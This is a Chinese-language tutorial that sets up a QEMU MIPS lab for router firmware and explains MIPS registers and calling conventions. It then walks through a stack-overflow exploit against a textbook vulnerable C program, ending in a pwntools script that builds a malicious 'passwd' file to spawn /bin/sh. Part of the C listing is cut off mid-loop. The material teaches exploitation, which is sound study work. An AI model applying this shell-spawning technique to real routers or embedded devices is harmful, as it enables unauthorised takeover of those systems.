    auto ens33
    iface ens33 inet manual
    up ifconfig ens33 0.0.0.0 up
    auto br0
    iface br0 inet dhcp
    bridge_ports ens33
    bridge_stp off
    bridge_maxwait 1
  1. 创建QEMU的网络接口启动脚本，重启网络使配置生效。  
创建并编辑 /etc/qemu-ifup 文件:
        sudo gedit /etc/qemu-ifup
写入以下内容：
        #!/bin/sh
    echo "Executing /etc/qemu-ifup"
    echo "Bringing $1 for bridged mode..."
    sudo /sbin/ifconfig $1 0.0.0.0 promisc up
    echo "Adding $1 to br0..."
    sudo /sbin/brctl addif br0 $1
    sleep 3
保存并赋予文件/etc/qemu-ifup可执行权限，然后重启网络使所有的配置生效。
        sudo chmod a+x /etc/qemu-ifup
    # 重启网络使配置生效
    sudo /etc/init.d/networking restart
  2. QEMU的启动配置，启动桥连网络。
    sudo ifdown ens33
    sudo ifup br0
#### 配置mips虚拟机
debian mips qemu镜像链接：  
选择 debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta。  
启动虚拟机：
    sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
虚拟机启动后，可使用root/root登录进去。
可能会网络不通，此时的解决方法为：  
ifconfig -a 看一下发现网络接口如果为eth1，将 /etc/network/interfaces 文件中的eth0改为eth1。再用ifup
eth1 将eth1启起来，运气好的话此时网络已经好了。
可在ubuntu上用SSH连接虚拟机，ssh root@虚拟机ip  
将之前解压的固件包拷贝到虚拟机里面：  
scp -r ./squashfs-root root@虚拟机ip:/root/  
完成搭建路由器固件运行的环境。
到这里，环境安装的部分就完成了。
## MIPS栈溢出
这一部分主要描述MIPS中的栈溢出相关的知识，假设大家已经有一定的x86漏洞利用经验。首先是介绍MIPS汇编的一些和x86不一样的地方，其次是一个简单栈溢出漏洞的利用。
### Mips 汇编基础
MIPS32寄存器分为两类：通用寄存器（GPR）和特殊寄存器。  
通用寄存器：MIPS体系结构中有32个通用寄存器，汇编程序中用$0~$31表示。也可以用名称表示，如$sp、$t1、$ra等。
编号 | 寄存器名称 | 描述  
---|---|---  
$0 | $zero | 第0号寄存器，其值始终为0。  
$1 | $at | 保留寄存器  
$2-$3 | $v0-$v1 | values，保存表达式或函数返回结果  
$4-$7 | $a0-$a3 | argument，作为函数的前四个参数  
$8-$15 | $t0-$t7 | temporaries，供汇编程序使用的临时寄存器  
$16-$23 | $s0-$s7 | saved values，子函数使用时需先保存原寄存器的值  
$24-$25 | $t8-$t9 | temporaries，供汇编程序使用的临时寄存器，补充$t0-$t7。  
$26-$27 | $k0-$k1 | 保留，中断处理函数使用  
$28 | $gp | global pointer，全局指针  
$29 | $sp | stack pointer，堆栈指针，指向堆栈的栈顶  
$30 | $fp | frame pointer，保存栈指针  
$31 | $ra | return address，返回地址  
特殊寄存器：有3个特殊寄存器：PC（程序计数器）、HI（乘除结果高位寄存器）和LO（乘除结果低位寄存器）。在乘法时，HI保存高32位，LO保存低32位。除法时HI保存余数，LO保存商。
寻址方式：寄存器寻址、立即数寻址、寄存器相对寻址和PC相对寻址。
指令特点：
  * 固定4字节指令长度。
  * 内存中的数据访问（load/store）必须严格对齐。
  * MIPS默认不把子函数的返回地址存放到栈中，而是存放到$ra寄存器中。
  * 流水线效应。MIPS采用了高度的流水线，其中一个重要的效应时分支延迟效应。
系统调用指令：SYSCALL指令是一个软中断，系统调用号存放在$v0中，参数存放在$a0-$a3中，如果参数过多，会存放在栈中。
MIPS32架构函数调用时对堆栈的分配和使用方式与x86架构有相似之处，但又有很大的区别。区别具体体现在：
  * 栈操作：与x86架构一样，都是向低地址增长的。但是没有EBP（栈底指针），进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的栈帧存储存储区域。
  * 调用：如果函数A调用函数B，调用者函数（函数A）会在自己的栈顶预留一部分空间来保存被调用者（函数B）的参数，称之为调用参数空间。
  * 参数传递方式：前四个参数通过$a0-$a3传递，多余的参数会放入调用参数空间。
  * 返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。
两个概念：
  * 叶子函数：当前函数不再调用其他函数。
  * 非叶子函数：当前函数调用其他函数。
函数调用的过程：父函数调用子函数时，复制当前$PC的值到$RA寄存器，然后跳到子函数执行；到子函数时，子函数如果为非叶子函数，则子函数的返回地址会先存入堆栈，否则仍在$RA寄存器中；返回时，如果子函数为叶子函数，则"jr
$ra"直接返回，否则先从堆栈取出再返回。
利用堆栈溢出的可行性：在非叶子函数中，可以覆盖返回地址，劫持程序执行流程；而在非叶子函数中，可通过覆盖父函数的返回地址实现漏洞利用。
### 栈溢出实例
在有了前面的基础后，最后再介绍一个具体的实例。
首先是源代码，是书上的一个简单栈溢出的代码：
    #include 
    #include 
    #include 
    void do_system(int code,char *cmd)
    {
        char buf[255];
        //sleep(1);
        system(cmd);
    }
    void main()
    {
        char buf[256]={0};
        char ch;
        int count = 0;
        unsigned int fileLen = 0;
        struct stat fileData;
        FILE *fp;
        if(0 == stat("passwd",&fileData))
            fileLen = fileData.st_size;
        else
            return 1;
        if((fp = fopen("passwd","rb")) == NULL)
        {
            printf("Cannot open file passwd!n");
            exit(1);
        }    
        ch=fgetc(fp);
        while(count mipsrop.stackfinders()
    ----------------------------------------------------------------------------------------------------------------    |  Address     |  Action                                              |  Control Jump                          |
    ----------------------------------------------------------------------------------------------------------------    |  0x004038D0  |  addiu $a1,$sp,0x58+var_40                           |  jr    0x58+var_4($sp)                 |
    ----------------------------------------------------------------------------------------------------------------    
可以看到要在`$sp+0x18`的位置放入`/bin/sh`同时在`$sp+0x54`的位置放入`do_system`函数的位置就可以得到shell。  
最后写出来生成passwd的脚本文件为：
    from pwn import *
    do_system_addr=0x400390
    stack_finder_addr=0x004038D0
    f=open("passwd","wb")
    data='a'*(0x1a0-4)
    data+=p32(stack_finder_addr)
    data+='a'*0x18
    data+='/bin/sh\x00'
    data=data.ljust(0x1a0+0x54,'a')
    data+=p32(do_system_addr)
    f.write(data)
    f.close()
可以使用gdb-multiarch调试跟踪程序的执行过程。
## 小结
万事开头难，还有很长的路要走。相关脚本在我的[github](https://github.com/ray-cp/MIPS/tree/master/book_note/stack_vuln)